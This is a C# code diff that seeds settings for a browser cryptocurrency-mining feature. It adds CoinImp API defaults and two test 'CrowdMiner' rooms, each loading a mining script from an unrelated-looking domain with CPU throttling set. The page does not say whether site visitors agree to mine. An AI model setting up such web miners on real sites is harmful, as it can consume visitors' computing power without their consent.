@@ -68,6 +68,11 @@ namespace SignalRService.Utils
             if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpApiBaseUrl))
                 defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpApiBaseUrl, Type = Enums.EnumSettingType.String, Value = "https://www.coinimp.com/api/v1/" });
 
+            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpApiCallTresholdSec))
+                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpApiCallTresholdSec, Type = Enums.EnumSettingType.Int, Value = "60" });
+
+            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpXMRPayoutPer1MHashes))
+                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpXMRPayoutPer1MHashes, Type = Enums.EnumSettingType.Decimal, Value = "0.00009467" });
 
             db.GeneralSettings.AddRange(defaultStandards);
             db.SaveChanges();
@@ -150,8 +155,41 @@ namespace SignalRService.Utils
             };
             db.ServiceSettings.Add(trackerService);
 
+            ///
+            var miningRoom0Service = new ServiceSettingModel() { };
+            miningRoom0Service.Owner = defAccountProp;
+            miningRoom0Service.ServiceName = "testMiningRoom0";
+            miningRoom0Service.ServiceUrl = "testMiningRoom0";
+            miningRoom0Service.ServiceType = Enums.EnumServiceType.CrowdMiner;
+            miningRoom0Service.MinerConfiguration = new MinerConfigurationModel()
+            {
+                ClientId = "33dd55318abfb839996ecf61c962bac94d4d7caba66debb0ea2aa3f61668e2b8",
+                ReportStatusIntervalMs = mc.ReportStatusIntervalMs,
+                ScriptUrl = "https://www.freecontent.date./tGu1.js",
+                StartDelayMs = mc.StartDelayMs,
+                Throttle = 0.7f
+            };
+
+            db.ServiceSettings.Add(miningRoom0Service);
+            db.MiningRooms.Add(new MiningRoomModel() { Name = "room0", Description = "***test***", ServiceSetting = miningRoom0Service });
 
 
+            var miningRoom1 = new ServiceSettingModel() { };
+            miningRoom1.Owner = defAccountProp;
+            miningRoom1.ServiceName = "testMiningRoom1";
+            miningRoom1.ServiceUrl = "testMiningRoom1";
+            miningRoom1.ServiceType = Enums.EnumServiceType.CrowdMiner;
+            miningRoom1.MinerConfiguration = new MinerConfigurationModel()
+            {
+                ClientId = "13f8168cb06d16abec48cf0b0cdf9e0027948b1c95913be3469d7592a672cd3d",
+                ReportStatusIntervalMs = mc.ReportStatusIntervalMs,
+                ScriptUrl = "https://www.freecontent.date./tGu1.js",
+                StartDelayMs = mc.StartDelayMs,
+                Throttle = 0.7f
+            };
+
+            db.ServiceSettings.Add(miningRoom1);
+            db.MiningRooms.Add(new MiningRoomModel() { Name = "room1", Description = "***test*** test", ServiceSetting = miningRoom1 });
 
             db.SaveChanges();
 
